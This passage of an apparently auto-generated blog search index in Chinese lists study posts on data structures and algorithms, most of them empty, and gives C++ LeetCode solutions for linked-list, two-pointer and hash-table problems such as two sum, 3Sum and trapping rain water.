<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>滑动窗口</title>
    <link href="/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    <url>/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>滑动窗口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子串</title>
    <link href="/2026/01/19/%E5%AD%90%E4%B8%B2/"/>
    <url>/2026/01/19/%E5%AD%90%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组</title>
    <link href="/2026/01/19/%E6%95%B0%E7%BB%84/"/>
    <url>/2026/01/19/%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>矩阵</title>
    <link href="/2026/01/19/%E7%9F%A9%E9%98%B5/"/>
    <url>/2026/01/19/%E7%9F%A9%E9%98%B5/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>矩阵</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图论</title>
    <link href="/2026/01/19/%E5%9B%BE%E8%AE%BA/"/>
    <url>/2026/01/19/%E5%9B%BE%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>图</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二分</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%88%86/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%88%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二分查找</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆</title>
    <link href="/2026/01/19/%E5%A0%86/"/>
    <url>/2026/01/19/%E5%A0%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>堆</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>贪心</title>
    <link href="/2026/01/19/%E8%B4%AA%E5%BF%83/"/>
    <url>/2026/01/19/%E8%B4%AA%E5%BF%83/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>贪心</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>trick</title>
    <link href="/2026/01/19/trick/"/>
    <url>/2026/01/19/trick/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>回溯</title>
    <link href="/2026/01/19/%E5%9B%9E%E6%BA%AF/"/>
    <url>/2026/01/19/%E5%9B%9E%E6%BA%AF/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>回溯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DP</title>
    <link href="/2026/01/19/DP/"/>
    <url>/2026/01/19/DP/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>动态规划</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈</title>
    <link href="/2026/01/19/%E6%A0%88/"/>
    <url>/2026/01/19/%E6%A0%88/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>链表</title>
    <link href="/2026/01/19/%E9%93%BE%E8%A1%A8/"/>
    <url>/2026/01/19/%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160.相交链表"></a>160.相交链表</h2><p><img src="/images/23.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * struct ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode *next;</span><br><span class="hljs-comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode *<span class="hljs-title">getIntersectionNode</span><span class="hljs-params">(ListNode *headA, ListNode *headB)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!headA || !headB) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        ListNode* p1 = headA;<br>        ListNode* p2 = headB;  <span class="hljs-comment">//双指针</span><br>        <span class="hljs-keyword">while</span>(p1 != p2)&#123;<br>            p1 = (p1 ? p1-&gt;next : headB);<br>            p2 = (p2 ? p2-&gt;next : headA);<br>        &#125;<br>        <span class="hljs-keyword">return</span> p1;  <span class="hljs-comment">//相交节点 or nullptr</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="206-反转链表"><a href="#206-反转链表" class="headerlink" title="206.反转链表"></a>206.反转链表</h2><p><img src="/images/24.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">reverseList</span><span class="hljs-params">(ListNode* head)</span> </span>&#123;<br>        ListNode* prev = <span class="hljs-literal">nullptr</span>;<br>        ListNode* cur = head;<br><br>        <span class="hljs-keyword">while</span>(cur)&#123;<br>            ListNode* tmp = cur-&gt;next; <span class="hljs-comment">//保存节点</span><br>            cur-&gt;next = prev;<br>            prev = cur;<br>            cur = tmp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> prev;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>双指针</title>
    <link href="/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/"/>
    <url>/2026/01/19/%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    
    <content type="html"><![CDATA[<h1 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h1><h2 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283.移动零"></a>283.移动零</h2><p><img src="/images/20.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveZeroes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> slow = <span class="hljs-number">0</span>; <span class="hljs-comment">//快慢双指针</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> fast = <span class="hljs-number">0</span>;fast &lt; nums.<span class="hljs-built_in">size</span>();fast++)&#123;<br>            <span class="hljs-keyword">if</span>(nums[fast] != <span class="hljs-number">0</span>)&#123;<br>                nums[slow] = nums[fast];<br>                slow++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = slow;j &lt; nums.<span class="hljs-built_in">size</span>();j++)&#123;<br>            nums[j] = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h2><p><img src="/images/21.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>,r = height.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> h = <span class="hljs-built_in">min</span>(height[l], height[r]);<br>            <span class="hljs-type">int</span> area = h * (r - l);<br>            ans = <span class="hljs-built_in">max</span>(ans, area);<br><br>            <span class="hljs-keyword">if</span>(height[l] &lt; height[r])&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15.三数之和"></a>15.三数之和</h2><p><img src="/images/22.png" alt="如图"></p><p>解:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">threeSum</span>(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(n &lt; <span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">return</span> res;<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(nums.<span class="hljs-built_in">begin</span>(),nums.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n - <span class="hljs-number">2</span>; i++)&#123;<br>            <span class="hljs-type">int</span> l = i + <span class="hljs-number">1</span>;<br>            <span class="hljs-type">int</span> r = n - <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">//i去重</span><br>            <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] == nums[i - <span class="hljs-number">1</span>]) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>                <span class="hljs-type">int</span> sum = nums[i] + nums[l] + nums[r];<br>                <span class="hljs-keyword">if</span>(sum == <span class="hljs-number">0</span>)&#123;<br>                    res.<span class="hljs-built_in">push_back</span>(&#123;nums[i],nums[l],nums[r]&#125;);<br>                    <span class="hljs-comment">//l r去重</span><br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[l] == nums[l + <span class="hljs-number">1</span>]) l++;<br>                    <span class="hljs-keyword">while</span>(l &lt; r &amp;&amp; nums[r] == nums[r - <span class="hljs-number">1</span>]) r--;<br>                    l++;<br>                    r--;<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; <span class="hljs-number">0</span>)&#123;<br>                    l++;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    r--;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42.接雨水"></a>42.接雨水</h2><p><img src="/images/25.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; height)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = height.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> leftmax = <span class="hljs-number">0</span>, rightmax = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span>(left &lt; right)&#123;<br>            <span class="hljs-keyword">if</span>(height[left] &lt; height[right])&#123;<br>                <span class="hljs-keyword">if</span>(height[left] &gt;= leftmax)&#123;<br>                    leftmax = height[left];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += leftmax - height[left];<br>                &#125;<br>                left++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">if</span>(height[right] &gt;= rightmax)&#123;<br>                    rightmax = height[right];<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    ans += rightmax - height[right];<br>                &#125;<br>                right--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>双指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>twoSum</title>
    <link href="/2026/01/17/twoSum/"/>
    <url>/2026/01/17/twoSum/</url>
    
    <content type="html"><![CDATA[<p>今天从<code>LeetCode</code>的第一题<code>两数之和</code>开始<code>数据结构与算法</code>的学习。</p><p>首先给出题目</p><p><img src="/images/14.png" alt="6"></p><p>第一个想法是直接两层for循环暴力枚举所有可能</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n =nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n; j++)&#123;<br>                <span class="hljs-keyword">if</span>(nums[i] + nums[j] == target)&#123;<br>                    <span class="hljs-keyword">return</span> &#123;i, j&#125;;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/15.png" alt="6"></p><p>虽然空间复杂度为<code>O(1)</code>，但是这样的话引入了很多无意义比较，比如某个<code>nums[i]</code>可能很小，却和很多不可能匹配的数相加，浪费了许多时间，因此时间复杂度达到了$O(n^2)$，太低效了…</p><p>看看能不能尝试优化一下，减少无意义的搜索</p><p>可以想到先对其进行排序，然后用左右双指针法根据两数之和与<code>target</code>的大小关系移动指针，使其更高效</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        vector &lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; a;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            a.<span class="hljs-built_in">push_back</span>(&#123;nums[i],i&#125;);<br>        &#125;<br>        <span class="hljs-built_in">sort</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> l = <span class="hljs-number">0</span>, r = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span>(l &lt; r)&#123;<br>            <span class="hljs-type">int</span> sum = a[l].first + a[r].first;<br>            <span class="hljs-keyword">if</span>(sum == target)&#123;<br>                <span class="hljs-keyword">return</span> &#123;a[l].second,a[r].second&#125;;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(sum &lt; target)&#123;<br>                l++;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                r--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/16.png" alt="6"></p><p>此时空间复杂度是<code>O(n)</code></p><p>可以看到确实快了一些，但是还不够，排序的时间复杂度为$O(n \log n)$，能不能不排序，直接实现快速查找？</p><p>这便要引出今天的数据结构:<strong>哈希表</strong></p><p>我们对题目再重新思考一下，题目其实在问，对于每个数<code>x</code>，是否存在一个数<code>y = target - x</code>？</p><p>这本质其实是一个<code>查找</code>问题，而不是<code>枚举</code>问题</p><p>我们可以这样做…</p><p>先遍历数组，对当前<code>nums[i]</code>计算<code>need = target - nums[i]</code>，如果<code>need</code>已经出现过，那么直接返回，否则就把 <code>nums[i]</code>存进<code>哈希表</code></p><p>这样时间复杂度便能达到<code>O(n)</code>，甚至是<code>O(1)</code>！</p><p>代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        unordered_map &lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp; <span class="hljs-comment">//值，索引</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++)&#123;<br>            <span class="hljs-type">int</span> need = target - nums[i];<br>            <span class="hljs-keyword">if</span>(mp.<span class="hljs-built_in">count</span>(need))&#123;<br>                <span class="hljs-keyword">return</span> &#123;mp[need],i&#125;;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                mp[nums[i]] = i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/images/17.png" alt="6"></p><p>时间复杂度完美，空间复杂度仍然是<code>O(n)</code>，因为哈希表本质就是空间换时间(不绝对)</p><p>待补充…</p><p>2026.1.19</p><p>仅记录一下做过的题目的代码…</p><p>49.字母异位词分组</p><p><img src="/images/18.png" alt="如图"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;string&gt;&gt; <span class="hljs-built_in">groupAnagrams</span>(vector&lt;string&gt;&amp; strs) &#123;<br>        unordered_map&lt;string, vector&lt;string&gt;&gt; mp;<br><br>        <span class="hljs-keyword">for</span>(string s : strs) &#123;<br>            string key =  s;<br>            <span class="hljs-built_in">sort</span>(key.<span class="hljs-built_in">begin</span>(),key.<span class="hljs-built_in">end</span>());<br>            mp[key].<span class="hljs-built_in">push_back</span>(s); <span class="hljs-comment">//值，索引</span><br>        &#125;<br><br>        vector&lt;vector&lt;string&gt;&gt; result;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; p : mp)&#123;<br>            result.<span class="hljs-built_in">push_back</span>(p.second);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>128.最长连续序列</p><p><img src="/images/19.png" alt="如图所示"></p><p>解法:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">longestConsecutive</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-function">unordered_set&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">st</span><span class="hljs-params">(nums.begin(), nums.end())</span></span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> x : st) &#123;<br>            <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">count</span>(x - <span class="hljs-number">1</span>)) &#123;<br>                <span class="hljs-type">int</span> cur = x;<br>                <span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><br>                <span class="hljs-keyword">while</span> (st.<span class="hljs-built_in">count</span>(cur + <span class="hljs-number">1</span>)) &#123;<br>                    cur++;<br>                    len++;<br>                &#125;<br>                ans = <span class="hljs-built_in">max</span>(ans, len);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哈希表</tag>
      
      <tag>性能优化</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>panorama</title>
    <link href="/2026/01/16/panorama/"/>
    <url>/2026/01/16/panorama/</url>
    
